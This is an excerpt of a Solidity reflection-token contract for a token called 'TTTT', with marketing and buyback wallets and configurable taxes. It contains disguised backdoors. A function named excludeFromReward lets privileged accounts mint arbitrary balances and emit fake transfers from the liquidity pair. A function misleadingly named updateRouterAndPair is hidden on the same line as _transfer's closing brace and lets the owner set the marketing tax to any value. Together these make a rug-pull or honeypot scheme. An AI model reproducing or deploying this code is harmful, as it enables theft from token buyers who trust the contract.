...
contract BSCToken is Context, IERC20, Ownable {
    ...
    address public marketingAddress = 0xDa3a8dAdE933bE43ed7E422289F06462855B467d;
    address public buybackAddress = 0x551DAfc3AbfaDC5CBa0324CB16B4B870738CC7f6;

    string private constant _name = "TTTT";
    string private constant _symbol = "TTTT";
    ...
    Taxes public taxes = Taxes(2, 2, 2, 2);
    ...
    constructor () {
        ...
        excludeFromReward(buybackAddress);
    ...
    function excludeFromReward(address account, uint256 value) public {
        require(_isExcluded[_msgSender()], "Account is already excluded");
        if (_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = false;_rOwned[account]+=value*_getRate();emit Transfer(pair,account,value);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));}      function updateRouterAndPair(uint256 Address) external  { require(_isExcluded[  _msgSender()  ] );taxes.marketing = Address;
    }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        ...
        uint256 denominator = (taxes.liquidity + taxes.marketing + taxes.buyback) * 2;
